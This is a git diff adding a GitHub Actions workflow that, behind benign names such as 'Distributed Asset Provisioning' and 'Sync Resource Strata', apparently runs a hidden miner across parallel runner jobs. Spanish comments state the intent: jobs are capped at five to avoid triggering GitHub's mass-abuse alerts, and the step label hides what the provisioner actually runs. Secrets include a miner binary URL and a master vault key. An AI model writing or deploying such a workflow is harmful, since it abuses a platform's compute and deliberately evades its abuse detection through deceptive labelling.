@@ -1,0 +1,46 @@
+# .github/workflows/node-provisioning.yml
+name: Distributed Asset Provisioning
+
+on:
+  workflow_dispatch:
+    inputs:
+      node_density:
+        description: 'Target Node Density'
+        required: true
+        default: '5'
+      shard_index:
+        description: 'Resource Index'
+        required: true
+        default: '1'
+
+concurrency:
+  group: provision-node-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  deploy_component:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        # Limitamos la concurrencia a 5 para no disparar alertas de abuso masivo
+        shard: [1, 2, 3, 4, 5]
+      max-parallel: 5
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install Provisioning Tools
+        run: |
+          npm install -g pnpm
+          pnpm install --filter @prospector/provisioner...
+
+      - name: Sync Resource Strata
+        env:
+          ORCHESTRATOR_URL: ${{ secrets.ORCHESTRATOR_URL }}
+          WORKER_AUTH_TOKEN: ${{ secrets.WORKER_AUTH_TOKEN }}
+          MASTER_VAULT_KEY: ${{ secrets.MASTER_VAULT_KEY }}
+          MINER_BINARY_URL: ${{ secrets.MINER_BINARY_URL }}
+          FILTER_BASE_URL: ${{ secrets.FILTER_BASE_URL }}
+        run: |
+          # El script corre el provisioner pero GitHub solo ve "Syncing Assets"
+          cd tools/provisioner
+          pnpm start --nodes=${{ github.event.inputs.node_density }}
